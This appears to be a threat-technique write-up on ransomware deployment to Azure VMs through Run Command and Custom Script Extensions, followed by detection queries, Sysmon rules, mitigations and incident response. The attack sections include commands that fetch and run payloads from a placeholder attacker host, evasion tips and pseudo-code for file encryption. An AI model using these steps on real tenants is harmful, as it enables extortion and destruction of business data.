# [IMPACT-RANSOM-001]: Ransomware Deployment Azure VMs

## 1. METADATA HEADER

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | IMPACT-RANSOM-001 |
| **Technique Name** | Ransomware Deployment Azure VMs |
| **MITRE ATT&CK v18.1** | Data Encrypted for Impact (T1486) – https://attack.mitre.org/techniques/T1486/ |
| **Tactic** | Impact |
| **Platforms** | Azure IaaS, Entra ID, Windows Server 2016–2025, Linux VMs |
| **Environment** | Entra ID / Azure VMs (Windows & Linux) |
| **Severity** | Critical |
| **CVE** | N/A (multiple ransomware families and tooling) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Azure IaaS VMs (all SKUs), Windows Server 2016–2025, major Linux distributions, Azure Backup/Storage when misconfigured |
| **Patched In** | N/A – relies on abuse of legitimate VM management & identity features; mitigated via hardening, EDR, backup and RBAC controls |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

- **Concept:** This technique describes how an adversary who has obtained sufficient Azure and/or VM-level privileges deploys and executes ransomware on Azure virtual machines. Instead of only encrypting on‑prem hosts, the attacker abuses Azure VM Run Command, Custom Script Extensions, or direct RDP/SSH access to push and run ransomware payloads inside guest OS disks and attached data disks. The goal is to encrypt business‑critical workloads in Azure (application servers, databases, file servers) to disrupt availability and extort the victim, while often also targeting Azure Backup artifacts and snapshots to impede recovery.
- **Attack Surface:** Azure Portal, Azure Resource Manager (ARM), Azure CLI/PowerShell, VM Run Command / Custom Script Extension, RDP/SSH into Azure VMs, Azure Backup, managed disks and snapshots.
- **Business Impact:** **Complete loss of availability of critical cloud workloads and potential loss of data if backups are also destroyed or encrypted.** Impact commonly includes multi‑day outages, revenue loss, breach of SLAs, and regulatory-reportable incidents if personal or regulated data is impacted.
- **Technical Context:** In observed incidents, once control of Entra ID or privileged Azure roles is obtained, ransomware deployment to Azure VMs can be scripted and executed in minutes across dozens or hundreds of machines. Detection depends on visibility into Azure Activity Logs, VM OS logs, EDR signals, and backup operations. Typical indicators include mass file encryption, deletion of shadow copies, suspicious use of Run Command/Custom Script Extension, and simultaneous backup deletion attempts.

### Operational Risk

- **Execution Risk:** High – Running encryption on production Azure VMs irreversibly modifies data. If immutable or offline backups are not available, recovery may be impossible.
- **Stealth:** Medium – Initial control-plane actions (Run Command, extension installs, backup deletions) may be relatively low-noise in under-instrumented environments, but the encryption phase is noisy on the guest (CPU, disk IO, process creation, Defender/EDR alerts).
- **Reversibility:** Low – Encrypted disks can typically only be restored from clean backups or snapshots. Some specific ransomware families have had cryptographic implementation flaws, but relying on this is not realistic.

### Compliance Mappings

| Framework | Control / ID | Description (Failure Mode) |
|---|---|---|
| **CIS Azure Foundations** | CIS AZURE 3.4, 4.1, 4.2 | Weak logging, monitoring and backup configuration for compute and storage allows undetected ransomware deployment and no usable restore points. |
| **DISA STIG** | MS Azure Compute STIG: V-XXXXX (logging), V-YYYYY (backup) | Insufficient audit of administrative operations and inadequate backup/restore protections for mission systems hosting DoD workloads. |
| **CISA SCuBA** | Logging & Monitoring, Data Protection | Failure to centralize and monitor cloud workload logs and to protect backups against tampering enables large‑scale impact. |
| **NIST SP 800‑53 Rev.5** | CP-9, CP-10, SI-3, SI-4, AC-6 | Weak backup (CP‑9/CP‑10) and malware protections (SI‑3/SI‑4), plus excessive privilege (AC‑6), enable data encryption for impact. |
| **GDPR** | Art. 32, 33, 34 | Inadequate technical and organizational measures to ensure ongoing availability and resilience of processing systems can constitute a violation; outages may trigger breach notification obligations. |
| **DORA** | Art. 5, 11 | Insufficient ICT risk management and operational resilience planning for cloud workloads leads to prolonged unavailability of critical services. |
| **NIS2** | Art. 21 | Lack of incident handling, business continuity, and crisis management for cloud‑hosted services affected by ransomware. |
| **ISO 27001:2022** | A.5.15, A.5.28, A.8.13 | Poor backup strategy, inadequate protection against malware, and weak secure configuration for cloud infrastructure. |
| **ISO 27005** | Risk Scenario: "Cloud production workload encrypted by ransomware, backups destroyed" | High‑impact risk affecting confidentiality, integrity, and especially availability of critical business services. |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges (Azure control plane):**
  - Typically one of: Owner, Contributor, Virtual Machine Contributor, or custom role with `Microsoft.Compute/virtualMachines/runCommand/action`, `Microsoft.Compute/virtualMachines/extensions/write`, and the ability to start/stop VMs.
  - For backup tampering: permissions over Recovery Services vaults, Backup vaults, and snapshots (`Microsoft.RecoveryServices/*`, `Microsoft.Compute/snapshots/*`).
- **Required Privileges (Guest OS):**
  - Local Administrator / root to disable security controls and encrypt protected locations.
  - Ransomware often escalates further to SYSTEM on Windows to access all files and Volume Shadow Copies.
- **Required Access:**
  - Azure Portal or API access (ARM, Azure CLI, PowerShell) to the subscription/VMs, or
  - Network access to RDP (Windows) / SSH (Linux) if the attacker connects directly to the guests.

**Supported Versions:**
- **Azure:** All public Azure regions, Azure Resource Manager model, both generation 1 and 2 VMs, managed disks.
- **Windows:** Server 2016, 2019, 2022, 2025, Windows 10/11 multi‑session (if used as session hosts).
- **Linux:** Major distributions supported on Azure (Ubuntu, RHEL, CentOS/Alma/Rocky, SUSE, Debian).
- **Backup:** Azure Backup vaults and Backup center; Azure Disk Backup; Azure Files/Blobs backup features.

- **Tools (attacker side):**
  - Ransomware payloads (e.g., Akira, BlackCat/ALPHV, etc.) compiled for Windows and/or Linux.
  - Azure CLI – https://learn.microsoft.com/cli/azure/
  - Az PowerShell – https://learn.microsoft.com/powershell/azure/overview
  - RDP / SSH client (mstsc, PuTTY, OpenSSH, etc.).

- **Tools (defender side):**
  - Microsoft Defender for Endpoint & Defender for Cloud – https://learn.microsoft.com/azure/defender-for-cloud/
  - Azure Monitor / Log Analytics – https://learn.microsoft.com/azure/azure-monitor/
  - Microsoft Sentinel – https://learn.microsoft.com/azure/sentinel/

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Plane Reconnaissance (Azure CLI / PowerShell)

**Objective:** Identify target VMs, their OS, attached disks, and backup coverage to prioritise ransomware deployment for maximum impact.

**Azure CLI – List VMs and OS types**
```bash
az vm list -d -o table 
```

**What to Look For:**
- Production subscriptions/resource groups.
- Business‑critical VMs (databases, app servers, domain controllers in IaaS scenarios).
- Publicly exposed VMs (public IPs) that may already be compromised.

**Azure CLI – List managed disks and snapshots**
```bash
az disk list -o table
az snapshot list -o table
```

**What to Look For:**
- Disks without snapshots or backups (high‑value, low‑resilience targets).
- Recently created snapshots that could be deleted to break recovery.

**Azure PowerShell – Enumerate VM backup status**
```powershell
Connect-AzAccount
Get-AzRecoveryServicesVault | Set-AzRecoveryServicesVaultContext
Get-AzRecoveryServicesBackupItem -WorkloadType AzureVM | 
  Select-Object ContainerName, FriendlyName, ProtectionStatus, LastBackupTime
```

**What to Look For:**
- Unprotected or misconfigured VMs.
- Long backup intervals / outdated last backup times, increasing data‑loss window.

### Guest Reconnaissance (Inside VM)

Once the attacker has access inside a VM (via Run Command, RDP, or SSH):

**Windows – Disk and share enumeration**
```powershell
Get-Volume | Where-Object {$_.DriveType -eq 'Fixed'}
Get-SmbShare
```

**Linux – Mounts and data paths**
```bash
lsblk
mount | egrep 'ext4|xfs|btrfs'
```

**What to Look For:**
- Data volumes with application and database files.
- Network shares mounted from Azure Files / on‑prem storage.

---

## 5. DETAILED EXECUTION METHODS AND THEIRS STEPS

### METHOD 1 – Using Azure VM Run Command (Windows VM)

**Supported Versions:** Azure VMs running Windows Server 2016–2025 with Azure VM Agent installed.

#### Step 1: Stage Ransomware Payload from Attacker‑Controlled Storage

**Objective:** Download the ransomware binary or script into the VM using Run Command.

**Command (Azure CLI):**
```bash
az vm run-command invoke \
  --resource-group <RG_NAME> \
  --name <VM_NAME> \
  --command-id RunPowerShellScript \
  --scripts "Invoke-WebRequest -Uri 'https://<attacker-storage>/payload.exe' -OutFile 'C:\\Windows\\Temp\\payload.exe'"
```

**Expected Output:**
- JSON result from Run Command with `status` = Succeeded and `stdout` showing successful download.

**What This Means:**
- Attacker has written an executable to a sensitive location in the VM without interactive RDP.

**OpSec & Evasion:**
- Use HTTPS with seemingly legitimate domain names or compromised storage accounts to reduce suspicion.
- Obfuscate PowerShell commands (e.g., base64‑encoded scripts) to evade simple string‑based detection.

**Troubleshooting:**
- **Error:** `VM has reported a failure when processing extension 'RunCommandWindows'`  
  - **Cause:** VM agent issues or script errors.  
  - **Fix:** Validate VM agent health; test benign commands first.

**References & Proofs:**
- Azure VM Run Command – https://learn.microsoft.com/azure/virtual-machines/run-command

#### Step 2: Execute Ransomware Binary via Run Command

**Objective:** Launch ransomware process with appropriate privileges.

**Command:**
```bash
az vm run-command invoke \
  --resource-group <RG_NAME> \
  --name <VM_NAME> \
  --command-id RunPowerShellScript \
  --scripts "Start-Process -FilePath 'C:\\Windows\\Temp\\payload.exe' -ArgumentList '/silent'"
```

**Expected Output:**
- Run Command result indicates success; on the VM, the ransomware process starts, enumerates volumes, and begins encryption.

**What This Means:**
- The attacker has executed arbitrary code as Local System (default for Run Command in many cases), enabling full access to local drives.

**OpSec & Evasion:**
- Throttle encryption rate or randomize targets to avoid immediate detection from heuristic engines.

**References & Proofs:**
- MITRE ATT&CK T1486 – https://attack.mitre.org/techniques/T1486/

### METHOD 2 – Using Custom Script Extension (Windows or Linux)

**Supported Versions:** Azure VMs with Azure VM Agent; Windows Server 2016–2025 and major Linux distros.

#### Step 1: Deploy Malicious Custom Script Extension

**Objective:** Use the Azure control plane to execute a script that downloads and runs ransomware.

**Command (Windows example – Azure CLI):**
```bash
az vm extension set \
  --publisher Microsoft.Compute \
  --name CustomScriptExtension \
  --resource-group <RG_NAME> \
  --vm-name <VM_NAME> \
  --settings '{"fileUris": ["https://<attacker-storage>/payload.ps1"],
               "commandToExecute": "powershell -ExecutionPolicy Bypass -File payload.ps1"}'
```

**Linux variant (bash script):**
```bash
az vm extension set \
  --publisher Microsoft.Azure.Extensions \
  --name CustomScript \
  --resource-group <RG_NAME> \
  --vm-name <VM_NAME> \
  --settings '{"fileUris": ["https://<attacker-storage>/payload.sh"],
               "commandToExecute": "bash payload.sh"}'
```

**Expected Output:**
- Extension provisioning state becomes `Succeeded`; script output appears in extension status.

**OpSec & Evasion:**
- Reuse existing extension names/settings where possible to blend with legitimate automation.

**References & Proofs:**
- Azure Custom Script Extension – https://learn.microsoft.com/azure/virtual-machines/extensions/custom-script-windows

#### Step 2: Encrypt Attached Data Disks and Mounted Shares

The script (`payload.ps1` / `payload.sh`) typically:
- Enumerates all mounted volumes.
- Stops databases / services to unlock files.
- Iterates files by extension and encrypts contents using symmetric key + RSA key‑wrap model.

**High‑Level Pseudo‑PowerShell:**
```powershell
$targetExtensions = '.docx','.xlsx','.pdf','.sql','.bak','.vhdx','.vhd'
Get-Volume | Where-Object DriveType -eq 'Fixed' | ForEach-Object {
  $drive = "$($_.DriveLetter):\"
  Get-ChildItem -Path $drive -Recurse -File -ErrorAction SilentlyContinue |
    Where-Object {$targetExtensions -contains $_.Extension} |
    ForEach-Object {
      # Encrypt content (placeholder for real crypto)
      $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
      $enc   = [CustomCrypto]::Encrypt($bytes, $Global:Key)
      [System.IO.File]::WriteAllBytes($_.FullName, $enc)
    }
}
```

---

### 6. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

#### Atomic Red Team

- **Atomic Test ID:** T1486 – Various tests (Windows, Linux, GPG, 7‑Zip, Akira note).
- **Test Name (example):** Encrypt files using gpg (Linux) / Akira ransomware style ransom note (Windows).
- **Description:** Simulates data encryption or ransom note creation to validate detection and response pipelines for T1486.
- **Supported Versions:**
  - Windows 10/11, Server 2016+ (Windows tests).  
  - Linux distributions for GPG/7‑Zip/ccencrypt tests.

**Example Execution (PowerShell – Windows ransom note):**
```powershell
Invoke-AtomicTest T1486 -TestNumbers 9
```

**Cleanup Command:**
```powershell
Invoke-AtomicTest T1486 -TestNumbers 9 -Cleanup
```

**Reference:**
- Atomic Red Team T1486 – https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1486/T1486.md

---

## 7. TOOLS & COMMANDS REFERENCE

### Azure CLI – VM Run Command & Extensions

**Version:** Latest stable (2.62+ recommended).

**Installation (Windows):**
```powershell
Invoke-WebRequest -Uri https://aka.ms/installazurecliwindows -OutFile .\AzureCLI.msi
Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'
```

**Basic Usage:**
```bash
az login
az vm list -o table
az vm run-command invoke --help
```

**Version-Specific Notes:**
- Older Azure CLI (pre‑2.30) may use slightly different argument validation for `--scripts`.

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Suspicious Use of Azure VM Run Command Followed by High File Activity

**Rule Configuration:**
- **Required Index:** `azure`, `wineventlog` (or your custom indices).
- **Required Sourcetypes:** `azure:monitor:activity`, `WinEventLog:Security` or Sysmon.
- **Alert Threshold:** ≥ 1 matching sequence per VM in 15 minutes.

**SPL Query (conceptual):**
```spl
index=azure sourcetype="azure:monitor:activity" 
| where operationName="Microsoft.Compute/virtualMachines/runCommand/action"
| stats latest(_time) as run_cmd_time by correlationId, resourceId, caller
| rename resourceId as vm_resource
| join type=inner vm_resource [
  search index=wineventlog (sourcetype="WinEventLog:Security" OR sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational")
  | eval file_event = if(EventCode IN (4663,11),1,0)
  | stats count(file_event) as file_events by host, bin(_time, 5m)
  | where file_events > 500
]
| table run_cmd_time, caller, vm_resource, host, file_events
```

**What This Detects:**
- Correlates Azure Run Command operations with a burst of file access events on the corresponding VM – a common pattern during ransomware encryption.

**Manual Configuration Steps:**
1. In Splunk Web, go to **Search & Reporting** and validate the query.  
2. Then go to **Settings → Searches, reports, and alerts** and create a **New Alert** with this SPL.  
3. Set alert to trigger on **Number of Results > 0** in a 15‑minute window.  
4. Configure email/Slack/SOAR actions to notify SOC and auto‑isolate the VM.

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Azure Run Command + Potential Ransomware on VM

**Rule Configuration:**
- **Required Tables:** `AzureActivity`, `SecurityEvent` (Windows) or `Syslog` (Linux) via Log Analytics agents.
- **Alert Severity:** High.
- **Frequency:** Every 5 minutes, look back 30 minutes.

**KQL Query:**
```kusto
let RunCommandOps = AzureActivity
  | where OperationNameValue =~ "MICROSOFT.COMPUTE/VIRTUALMACHINES/RUNCOMMAND/ACTION"
  | where ActivityStatusValue =~ "Succeeded"
  | project RunTime = TimeGenerated, Caller, CorrelationId, VM = ResourceId;
let RansomLikeActivity = SecurityEvent
  | where EventID == 4663
  | where ObjectName has_any (".docx", ".xlsx", ".pdf", ".sql", ".bak")
  | summarize FileOps = count() by bin(TimeGenerated, 5m), Computer
  | where FileOps > 500;
RunCommandOps
| join kind=inner (
  RansomLikeActivity
  | project TimeGenerated, Computer, FileOps
) on $left.RunTime <= $right.TimeGenerated and $right.TimeGenerated <= $left.RunTime + 30m
| project TimeGenerated, Caller, VM, Computer, FileOps
```

**What This Detects:**
- Links successful Run Command actions in Azure with intense file access activity on the VM, which may indicate encryption.

**Manual Configuration Steps (Azure Portal):**
1. Azure Portal → **Microsoft Sentinel** → select workspace.  
2. Go to **Analytics → + Create → Scheduled query rule**.  
3. Paste the KQL, set frequency to 5 minutes, look‑back 30 minutes.  
4. Set severity to **High** and enable **Create incidents**.  
5. Add playbook automation to isolate the VM or disable the NIC.

---

## 10. WINDOWS EVENT LOG MONITORING

**Relevant Event IDs (Windows VMs):**
- **4663 – An attempt was made to access an object:** Massive volume of 4663 events on data volumes often accompanies ransomware.
- **4688 – A new process has been created:** Sudden execution of unknown binaries from temp folders or user profiles.
- **25 / 16 – Microsoft-Windows-Defender/Operational:** Ransomware or suspicious crypto-like behavior alerts.

**Manual Configuration Steps (Group Policy to enable Process Creation auditing):**
1. Open **gpmc.msc**.  
2. Navigate to **Computer Configuration → Policies → Windows Settings → Security Settings → Advanced Audit Policy Configuration → System Audit Policies → Detailed Tracking**.  
3. Enable **Audit Process Creation** (Success, Failure).  
4. Run `gpupdate /force` on target Azure VMs (or ensure policy refresh).

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Example Sysmon Config Snippet (Monitor suspicious encryption tools & mass file writes):**
```xml
<Sysmon schemaversion="4.50">
  <EventFiltering>
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">7z.exe</CommandLine>
      <CommandLine condition="contains">gpg.exe</CommandLine>
      <CommandLine condition="contains">-enc</CommandLine>
    </ProcessCreate>
    <FileCreate onmatch="include">
      <TargetFilename condition="ends with">.akira</TargetFilename>
      <TargetFilename condition="ends with">.lockbit</TargetFilename>
      <TargetFilename condition="ends with">.crypt</TargetFilename>
    </FileCreate>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from Microsoft Sysinternals – https://learn.microsoft.com/sysinternals/downloads/sysmon  
2. Save the config as `sysmon-config.xml` and install:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
3. Forward Sysmon logs to Sentinel / Splunk via the Log Analytics agent or Splunk UF.

---

## 12. MICROSOFT DEFENDER FOR CLOUD

### Detection Alerts

**Example Alerts (Azure VMs & Storage):**
- "Ransomware behavior detected in a virtual machine" – triggered by Defender for Endpoint behavioral detections on VM.
- "Suspicious mass file deletion in Azure Storage" or "Unusual operations on backup items" (via Defender for Storage/Defender for Cloud integration).

**Manual Configuration Steps (Enable Defender for Servers & Storage):**
1. Azure Portal → **Microsoft Defender for Cloud**.  
2. Go to **Environment settings** → select subscription.  
3. Under **Defender plans**, enable: **Defender for Servers**, **Defender for Storage**, **Defender for SQL** as relevant.  
4. Ensure integration with Microsoft Sentinel is enabled to surface alerts.

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

Although this technique targets Azure VMs, ransomware operations often extend to M365 storage (OneDrive/SharePoint/Teams) through synced clients. Similar detection logic for abnormal file rename patterns can be applied using Purview Unified Audit Log.

**Example Query – Suspicious File Renames in OneDrive/SharePoint (ransomware‑like):**
```powershell
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-1) -EndDate (Get-Date) \
  -Operations FileRenamed -ResultSize 5000 |
  Where-Object { $_.Workload -in @('OneDrive','SharePoint') }
```

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Enforce Strong Identity & Least Privilege for Azure VM Management**
- Restrict high‑impact roles (Owner, Contributor, Virtual Machine Contributor) and enforce Privileged Identity Management (PIM) with approval and time‑bound elevation.

**Manual Steps (Azure Portal):**
1. Azure Portal → **Entra ID → Roles and administrators**.  
2. Review assignments for high‑privilege roles; remove unnecessary accounts.  
3. Enable PIM for those roles and configure approval workflow + MFA for activation.  
4. Require Conditional Access for privileged roles (MFA, compliant devices).

**Action 2: Harden Backups and Snapshots (Immutable & Isolated)**
- Use Azure Backup with soft delete, enhanced soft delete, and immutable vaults to protect recovery points from tampering.

**Manual Steps (Azure Portal):**
1. **Recovery Services vault** → **Properties** → Enable **Soft Delete** / **Enhanced Soft Delete**.  
2. Configure immutability (immutable vaults) and retention long enough to cover ransomware dwell times.  
3. Use a dedicated subscription/tenant for backup administration to isolate from production compromise.

**Action 3: Endpoint Protection on All Azure VMs**
- Enable Microsoft Defender for Endpoint with tamper protection and ransomware behavior detection on all VMs.

### Priority 2: HIGH

**Action: Network Segmentation & Just‑In‑Time (JIT) Access**
- Limit RDP/SSH exposure, require JIT access, and only from trusted IP ranges.

**Manual Steps:**
1. Azure Portal → **Microsoft Defender for Cloud → Workload protections → Just-in-time VM access**.  
2. Enable JIT for all internet‑facing VMs; restrict source IPs and allowed ports.

### Access Control & Policy Hardening

**Conditional Access:**
- Require MFA and compliant devices for administrators; block legacy authentication.

**RBAC/ABAC:**
- Use granular custom roles that exclude `runCommand` and extension management where not strictly required.

**Validation Command (Verify Run Command Restrictions)**
```powershell
az role definition list --name "Custom-VM-Operator" | ConvertFrom-Json | 
  Select-Object -ExpandProperty permissions | 
  Where-Object { $_.actions -like '*Microsoft.Compute/virtualMachines/runCommand/*' }
```

**Expected Output (If Secure):**
- No actions granting Run Command or extension write permissions in non‑admin roles.

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Files:** Ransomware binaries and scripts on VMs (e.g., `C:\Windows\Temp\*.exe`, `/tmp/*.bin`), ransom notes placed in multiple directories (e.g., `C:\Users\*\Desktop\READ_ME.txt`, `.akira` extensions).
- **Registry / Config:** Modified Windows Defender or backup service settings, disabled services, or altered startup configs.
- **Network:** Outbound connections from Azure VMs to uncommon C2 domains/IPs used for key exchange or exfiltration.

### Forensic Artifacts

- **Azure Activity Logs:** `Microsoft.Compute/virtualMachines/runCommand/action`, `*/extensions/write`, VM start/stop, snapshot or backup deletion operations.
- **Disk:** Encrypted files and deleted shadow copies; new ransom notes.  
- **Memory:** Ransomware process memory containing keys or configuration.  
- **Cloud:** Defender for Cloud / Sentinel alerts correlated with unusual backup and storage operations.

### Response Procedures

1. **Isolate Affected VMs**
   - Azure Portal: VM → **Networking** → remove NIC from production subnet or apply NSG rule to block all inbound/outbound.
   - PowerShell quick isolation:
   ```powershell
   Stop-AzVM -Name <VM_NAME> -ResourceGroupName <RG_NAME> -Force
   ```

2. **Collect Evidence**
   - Export Azure Activity Logs for timeframe of compromise.
   - On Windows VMs:
   ```powershell
   wevtutil epl Security C:\Evidence\Security.evtx
   wevtutil epl "Microsoft-Windows-Sysmon/Operational" C:\Evidence\Sysmon.evtx
   ```

3. **Eradicate & Recover**
   - Do not attempt to "clean" encrypted VMs in place; instead:
     - Restore from known‑good VM backups or disk snapshots (Azure Backup / Disk Backup).
     - Rotate all credentials and secrets used by workloads on those VMs.
   - Validate restoration by scanning with Defender for Endpoint before reconnecting to production networks.

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | IA-PHISH-001 / IA-VALID-001 | Phishing or valid account abuse to gain Entra ID / Azure portal access. |
| **2** | **Privilege Escalation** | PE-VALID-010 / PE-ACCTMGMT-011 | Escalate to high‑privilege Azure roles (Owner, GA, Subscription Contributor). |
| **3** | **Current Step** | **[IMPACT-RANSOM-001] Ransomware Deployment Azure VMs** | Use Run Command / Custom Script / RDP/SSH to execute ransomware on Azure VMs. |
| **4** | **Defense Evasion & Impact** | T1490 / T1485 | Delete backups, snapshots, and logs; inhibit recovery and destroy additional data. |
| **5** | **Impact & Extortion** | T1486 + Exfiltration | Maintain encryption, possibly exfiltrate data, and extort victim for decryption key and non‑leak promises. |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: Ransomware Targeting Cloud Storage & Azure Workloads

- **Target:** Enterprises using Azure Storage and IaaS workloads.  
- **Timeline:** 2023–2025.  
- **Details:** Multiple investigations (e.g., BlackCat/ALPHV Sphinx variant) showed attackers pivoting from on‑prem to Azure, obtaining Storage account keys and using them to encrypt Azure Storage objects directly. Similar TTPs have been observed for Azure VMs, where threat actors with Azure Portal access deploy ransomware to cloud workloads using legitimate management capabilities.
- **Impact:** Encrypted storage accounts, disruption of applications depending on blobs and files, and increased pressure on victims due to impaired backup strategies.

### Example 2: Weaponising VMs to Bypass EDR (Akira)

- **Target:** Hypervisors and virtual workloads (conceptually similar to Azure VMs).  
- **Timeline:** 2023–2024.  
- **Details:** Akira operators were observed creating fresh VMs on hypervisors, then mounting datastore disks and shutting down victim VMs before encrypting their virtual disk images from the attacker‑controlled VM. This bypassed EDR agents installed on production VMs while still achieving mass encryption of workloads.
- **Relevance to Azure:** The same concept applies to Azure where control‑plane actions (Run Command, disk attach/detach, snapshots) can be abused to run encryption from attacker‑controlled contexts while evading some endpoint controls.

---